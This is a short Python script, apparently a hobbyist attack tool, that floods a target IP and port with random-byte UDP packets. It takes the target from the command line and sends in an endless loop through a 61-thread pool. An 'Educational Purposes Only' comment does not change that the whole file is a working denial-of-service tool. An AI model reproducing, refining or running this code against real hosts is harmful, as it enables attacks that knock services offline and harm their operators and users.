import socket
import sys
from concurrent.futures import Future
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import as_completed
try:
    from random import randbytes
except:
    print("It is required to use python 3.9+ version in order to run this script")
    sys.exit(-1)
# Educational Purposes Only
# Z3NTL3

count = 0
def Usage():
    print(f"""
python3 {__file__} ip port bytes
""")

try:
    websiteHost_or_IP = sys.argv[1]
    portX = int(sys.argv[2])
    bytesX = int(sys.argv[3])
    
except:
    Usage()
    sys.exit(-1)
def CheckValid():
    try:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as socks:
            socks.settimeout(5)
            socks.connect((sys.argv[1],portX))
        return True
    except:
        return False
    
def Flooder(**pHu):
    global count
    sVar = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    try:
        z3Payload = randbytes(bytesX)
        sendByte = sVar.sendto(z3Payload, (pHu['host_ip'],pHu['port']))
        count+=1
        return f"SEND {count} udp Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
    except:
        return f"udp Flood Failed On {pHu['host_ip']}:{pHu['port']}"
    finally:
       sVar.close()
    
def Main():
    global count
    pool =  ThreadPoolExecutor(max_workers=61)
    while True:
        f = pool.submit(Flooder,host_ip=websiteHost_or_IP,port=portX)
        print(f.result())
        
if __name__ == "__main__":
    #validity = CheckValid()
    #if validity == False:
    #    sys.exit("This ip:port refused the connection")
    Main()
